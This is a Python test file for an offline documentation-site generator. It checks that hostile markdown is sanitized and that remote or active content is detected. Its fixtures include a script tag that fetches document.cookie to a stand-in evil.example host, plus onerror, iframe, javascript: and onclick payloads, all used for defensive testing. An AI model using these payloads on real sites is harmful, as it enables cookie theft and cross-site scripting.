"""Sitio sin conexión (M9, F3): `generate(offline=True)`, recursos empaquetados, `check_site_offline` y el test de
aceptación de D6 con un build real."""

import hashlib
import importlib.util
import re
import tomllib

from datetime import UTC, datetime
from pathlib import Path

import pytest

from doc_organize.context.offline_site import check_site_offline
from doc_organize.context.reorganizer import Reorganizer
from doc_organize.context.site_generator import SiteGenerator
from doc_organize.core.models import Context, Domain, DomainDocument, Project

#: Un manejador `on*` dentro de una etiqueta HTML (no como texto).
ACTIVE_ATTRIBUTE = re.compile(r"<[a-zA-Z][^<>]*\son[a-z]+\s*=", re.IGNORECASE)
VENDORED = {
    "mermaid/mermaid.min.js": "a8a6a6f805b074a8261a2825c86f99c8054acb3b35f50bb7e24a4f9f2c3c3b9f",
    "iframe-worker/shim.js": "e8e412dbcfea9b7e31b5ffa288d7b6035915e714c542f4176a0cdbe262fc9609",
}
HOSTILE = """# Informe hostil

<script>fetch('https://evil.example/?q='+document.cookie)</script>

<img src="x" onerror="alert('img')">

<iframe src="https://evil.example/frame"></iframe>

[pulsa aquí](javascript:alert('link')) y ![píxel](https://tracker.example/p.png)

[otro]{onclick="alert('attr')"}

<!-- image -->
"""


def _project(tmp_path: Path) -> Project:
    return Project(name="Demo", root_path=str(tmp_path), created_at=datetime.now(UTC).isoformat())


async def _reorganized(tmp_path: Path, markdown: str = HOSTILE) -> tuple[Project, Context]:
    project = _project(tmp_path)
    for name in ("informe.pdf", "informe.json"):
        (tmp_path / name).write_bytes(b"{}")
    (tmp_path / "informe.md").write_text(markdown, encoding="utf-8")
    document = DomainDocument(
        source_path=str(tmp_path / "informe.pdf"),
        markdown_path=str(tmp_path / "informe.md"),
        json_path=str(tmp_path / "informe.json"),
        title="Informe",
        document_type="pdf",
        confidence=0.9,
    )
    now = datetime.now(UTC).isoformat()
    context = Context(project_name="Demo", domains=[Domain(slug="calidad", name="Calidad", documents=[document])], created_at=now, updated_at=now)
    await Reorganizer().reorganize(project, context)
    return project, context


def test_vendored_assets_are_the_reviewed_ones() -> None:
    vendor = Path(importlib.util.find_spec("doc_organize").origin).parent / "context" / "site_assets" / "vendor"  # type: ignore[arg-type]
    for relative, digest in VENDORED.items():
        assert hashlib.sha256((vendor / relative).read_bytes()).hexdigest() == digest, relative
    assert (vendor / "mermaid" / "LICENSE").is_file() and (vendor / "iframe-worker" / "LICENSE").is_file()


@pytest.mark.asyncio
async def test_offline_config_assets_and_neutralized_copy(tmp_path) -> None:
    project, context = await _reorganized(tmp_path)
    original = (tmp_path / "informe.md").read_text(encoding="utf-8")

    result = await SiteGenerator().generate(project, context, build=False, offline=True)

    config = tomllib.loads((tmp_path / "zensical.toml").read_text(encoding="utf-8"))["project"]
    assert config["plugins"] == {"offline": {"enabled": True}}
    assert config["extra_javascript"] == ["_offline/mermaid/mermaid.min.js"]
    assert config["extra"] == {"polyfills": ["_offline/iframe-worker/shim.js"]}
    output = tmp_path / "organizado"
    assert (output / "_offline" / "mermaid" / "mermaid.min.js").is_file() and not (output / "_offline" / "README.md").exists()
    page = (output / "calidad" / "pdf" / "informe" / "informe.md").read_text(encoding="utf-8")
    assert "<script" not in page and "<img" not in page and "javascript:" not in page and "<!-- image -->" in page
    assert result.offline and result.neutralized == ("calidad/pdf/informe/informe.md",)
    assert result.neutralized_counts == {"attributes": 1, "html": 5, "remote_images": 1, "unsafe_links": 1}
    assert (tmp_path / "informe.md").read_text(encoding="utf-8") == original  # la conversión no se toca

    normal = await SiteGenerator().generate(project, context, build=False)

    config = tomllib.loads((tmp_path / "zensical.toml").read_text(encoding="utf-8"))["project"]
    assert "plugins" not in config and "extra_javascript" not in config and not (output / "_offline").exists()
    assert not normal.offline and normal.neutralized == ()


def _site(root: Path, pages: dict[str, str], *, search: bool = True) -> Path:
    for relative, html in pages.items():
        (root / relative).parent.mkdir(parents=True, exist_ok=True)
        (root / relative).write_text(html, encoding="utf-8")
    if search:
        (root / "search.js").write_text("var index = {};", encoding="utf-8")
    return root


def test_check_accepts_a_clean_site(tmp_path) -> None:
    site = _site(
        tmp_path,
        {
            "index.html": '<a href="a/b.html#s">b</a> <a href="https://zensical.org/">ext</a> <script src="assets/x.js"></script><img src="i.png">',
            "a/b.html": '<a href="../index.html">inicio</a> <a href="#arriba">arriba</a> <a href="mailto:x@e.example">correo</a>',
            "assets/x.js": "var url = 'https://unpkg.com/mermaid@12/dist/mermaid.min.js';",
            "i.png": "",
        },
    )

    report = check_site_offline(site)

    assert report.ok and report.pages == 2 and report.problems() == []
    assert [issue.detail for issue in report.script_references] == ["https://unpkg.com/mermaid@12/dist/mermaid.min.js"]


def test_check_finds_every_problem(tmp_path) -> None:
    site = _site(
        tmp_path,
        {
            "index.html": (
                '<script src="https://unpkg.com/x.js"></script><link rel="stylesheet" href="//cdn.example/s.css">'
                '<img src="https://tracker.example/p.png"><a href="carpeta/">carpeta</a><a href="falta.html">roto</a>'
                '<a href="javascript:alert(1)">x</a><button onclick="alert(1)">b</button>'
            ),
        },
        search=False,
    )
    (tmp_path / "carpeta").mkdir()

    report = check_site_offline(site)

    assert not report.ok
    assert [issue.detail for issue in report.remote_resources] == ["https://unpkg.com/x.js", "//cdn.example/s.css", "https://tracker.example/p.png"]
    assert [issue.detail for issue in report.folder_links] == ["carpeta/"] and [issue.detail for issue in report.broken_links] == ["falta.html"]
    assert len(report.active_content) == 2 and not report.search_index_js
    assert any("search.js" in line for line in report.problems())


def test_check_needs_an_existing_site(tmp_path) -> None:
    with pytest.raises(FileNotFoundError):
        check_site_offline(tmp_path / "no-existe")
    assert not check_site_offline(tmp_path).ok  # sin páginas


@pytest.mark.slow
@pytest.mark.asyncio
@pytest.mark.skipif(importlib.util.find_spec("zensical") is None, reason="Requiere el extra 'site' (zensical)")
async def test_acceptance_d6_hostile_document_produces_nothing_active(tmp_path) -> None:
    """Test de aceptación de D6 (S-F3-1): un documento con `<script>`, `<img onerror>`, `<iframe>`, `javascript:`, una
    lista de atributos con `onclick` y una imagen remota no produce nada activo en `site/`, ni en el HTML ni en el
    índice de búsqueda, y el sitio no carga nada de terceros."""
    project, context = await _reorganized(tmp_path)

    result = await SiteGenerator().generate(project, context, offline=True, timeout=300)

    report = check_site_offline(result.site_dir)
    assert report.ok, report.problems()
    page = (result.site_dir / "calidad" / "pdf" / "informe" / "informe.html").read_text(encoding="utf-8")
    search = (result.site_dir / "search.js").read_text(encoding="utf-8")
    for text in (page, search.replace('\\"', '"')):  # el índice guarda el HTML en cadenas JSON
        assert "<script>fetch" not in text and "<iframe src=" not in text and '<img src="x"' not in text
        assert 'href="javascript:' not in text and not ACTIVE_ATTRIBUTE.search(text)  # `{onclick=…}` solo como texto
    assert '<img src="https://tracker.example' not in page and 'href="https://tracker.example/p.png"' in page  # enlace, no imagen
    assert "_offline/mermaid/mermaid.min.js" in page and "unpkg.com/iframe-worker" not in page
    assert (result.site_dir / "_offline" / "mermaid" / "mermaid.min.js").is_file()


def _tree(root: Path) -> dict[str, str]:
    return {path.relative_to(root).as_posix(): hashlib.sha256(path.read_bytes()).hexdigest() for path in sorted(root.rglob("*")) if path.is_file()}


@pytest.mark.asyncio
async def test_work_dir_builds_outside_the_project_without_touching_it(tmp_path) -> None:
    """Petición de la web (W8): construir el sitio sin conexión aparte, sin neutralizar la carpeta del proyecto."""
    project_root = tmp_path / "proyecto"
    project_root.mkdir()
    project, context = await _reorganized(project_root)
    await SiteGenerator().generate(project, context, build=False)
    before = _tree(project_root)
    work = tmp_path / "trabajo"

    result = await SiteGenerator().generate(project, context, build=False, offline=True, llms_txt=True, work_dir=work)

    assert _tree(project_root) == before  # ni páginas, ni zensical.toml, ni sitio del proyecto
    assert result.config_path == work / "zensical.toml" and result.site_dir == work / "site"
    config = tomllib.loads(result.config_path.read_text(encoding="utf-8"))["project"]
    assert config["docs_dir"] == "organizado" and config["site_dir"] == "site" and config["plugins"] == {"offline": {"enabled": True}}
    page = (work / "organizado" / "calidad" / "pdf" / "informe" / "informe.md").read_text(encoding="utf-8")
    assert "<script" not in page and result.neutralized == ("calidad/pdf/informe/informe.md",)
    assert (work / "organizado" / "llms.txt").is_file() and (work / "organizado" / "_offline" / "mermaid" / "mermaid.min.js").is_file()
    assert "[Informe](calidad/pdf/informe/informe.html)" in (work / "organizado" / "llms.txt").read_text(encoding="utf-8")


@pytest.mark.asyncio
@pytest.mark.parametrize("where", ["dentro", "no_vacia", "con_site_dir"])
async def test_work_dir_is_validated(tmp_path, where) -> None:
    from doc_organize.core.exceptions import InvalidPathError

    project_root = tmp_path / "proyecto"
    project_root.mkdir()
    project, context = await _reorganized(project_root)
    work = {"dentro": project_root / "trabajo", "no_vacia": tmp_path / "trabajo", "con_site_dir": tmp_path / "otro"}[where]
    if where == "no_vacia":
        work.mkdir()
        (work / "algo.txt").write_text("x", encoding="utf-8")

    with pytest.raises(InvalidPathError):
        await SiteGenerator().generate(
            project, context, build=False, offline=True, work_dir=work, site_dir=Path("site") if where == "con_site_dir" else None
        )

    assert not (project_root / "trabajo").exists() and not (tmp_path / "otro").exists()


def test_problems_never_carry_the_site_root(tmp_path) -> None:
    """Petición de la web (W8): los problemas van relativos al sitio, sin la carpeta donde se construyó."""
    site = _site(tmp_path / "raiz-temporal", {"a/index.html": '<img src="https://x.example/p.png"><a href="../falta.html">x</a>'}, search=False)

    problems = check_site_offline(site).problems()

    assert problems and not any("raiz-temporal" in line or str(tmp_path) in line for line in problems)
    assert "Enlace roto en a/index.html: ../falta.html" in problems


@pytest.mark.slow
@pytest.mark.asyncio
@pytest.mark.skipif(importlib.util.find_spec("zensical") is None, reason="Requiere el extra 'site' (zensical)")
async def test_real_build_in_work_dir_passes_the_offline_check(tmp_path) -> None:
    project_root = tmp_path / "proyecto"
    project_root.mkdir()
    project, context = await _reorganized(project_root)

    result = await SiteGenerator().generate(project, context, offline=True, work_dir=tmp_path / "trabajo", timeout=180)

    assert check_site_offline(result.site_dir).ok and not (project_root / "site").exists() and not (project_root / "zensical.toml").exists()
